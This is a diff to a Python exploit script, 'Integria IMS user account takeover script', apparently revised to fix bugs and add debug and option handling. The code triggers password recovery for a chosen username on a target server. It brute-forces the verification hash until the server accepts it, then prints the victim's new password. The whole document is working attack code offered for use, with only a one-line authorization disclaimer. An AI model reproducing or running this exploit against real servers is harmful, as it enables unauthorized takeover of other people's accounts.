@@ -26,8 +26,8 @@ Thus, all that is needed to gain access to a user's account is their username.
 '''
 
 import requests, sys, hashlib
-from parser import OptionParser
-
+from optparse import OptionParser
+debug = False
 
 
 # parse the Sitename from the login page HTML text
@@ -50,15 +50,19 @@ def getNewPassword(htmlText):
 	
 def printMain():
 	print 'Integria IMS user account takeover script'
-	print 'DO NOT attack a server you do not have express authority to attack!'
-	print '\nUsage: integria_user_hijack.py [servername or IP] [username]'
+	print '!!!! DO NOT USE without proper authorization !!!!'
 
-# setup optoin parsing
-parser.add_option("-s", "--server", dest=server, help="Target hostname or IP address")
-parser.add_option("-u", "--username", dest=username, help="Username to takeover")
+# Start main code
+parser = OptionParser('Usage: takeover.py -s [server name or IP] -u [target username]\nExample: takeover.py -s http://192.168.1.45/integria -u root')
+# setup option parsing
+parser.add_option("-s", "--server", dest="server", help="URL to target, excluding any specific page. Example: http://example.com/integriaims")
+parser.add_option("-u", "--username", dest="username", help="Username to takeover")
+parser.add_option("-d", "--debug", dest="debug", action="store_true", help="Turn on debug output")
+
 (options, args) = parser.parse_args()
 success = False
 
+debug = options.debug
 server = options.server
 username = options.username
 
@@ -76,16 +80,18 @@ if (username == None):
 # print the disclaimer and usage information
 printMain()
 
-print '[ ] Hijacking account ' + username + ' on ' + server
+print '[ ] Hijacking account \'' + username + '\' on ' + server
 #start by getting the sitename (is the <title> of the default login page)
-print "[ ] Retrieving sitename..."
-r = requests.get('http://' + server + '/integria/')
+if (debug):
+	print "[d] Retrieving sitename..."
+r = requests.get(server)
 sitename = getSiteName(r.text)
-print "[ ] Found sitename: " + sitename
+if (debug):
+	print "[d] Found sitename: " + sitename
 
 #trigger the password recovery process on the Integria server
-print "Triggering password recovery procedure for " + username + "..."
-r = requests.get("http://" + server + "/integria/index.php?recover=" + username)
+print "[ ] Triggering password recovery procedure..."
+r = requests.get(server + "/index.php?recover=" + username)
 if ("Don't close this window:" in r.text):
 	print "[ ] Password reset process triggered successfully" #Successfully got the server to generate a verificaiton code. Now we can try to brute force it
 	
@@ -98,16 +104,21 @@ if ("Don't close this window:" in r.text):
 		testhash = m.hexdigest()
 		
 		# send the code to the server
-		r = requests.post('http://' + server + '/integria/index.php?recover=' + username, data={'hash' : testhash})
+		r = requests.post(server + '/index.php?recover=' + username, data={'hash' : testhash})
 		if ('Invalid' not in r.text):
 			#success, this was the verification code. Print it along with the new password (which is contained in the response HTML page)
-			print '[+] Success!\nVerification code: ' + testhash + "\n" + username + '\'s new password: ' + getNewPassword(r.text)
+			print '[+] Success! Account \'' + username + '\' new password: ' + getNewPassword(r.text)
+			if (debug):
+				print '[d] Verification code: ' + testhash
 			success = True
 			break
 		# else it wasn't the correct code, loop back around and try the next one
-
+else:
+	print '[-] Failed to start password reset process'
+	if (debug):
+		print '[d] Code=' + str(r.status_code) + ' response text from server=' + r.text
 # failure, for whatever reason we didn't reset the password
-if (!success):
+if (success == False):
 	print "[-] Password was not found, please try running the script again (is the target version vulnerable?)"
 	
 print "[ ] Operations complete"
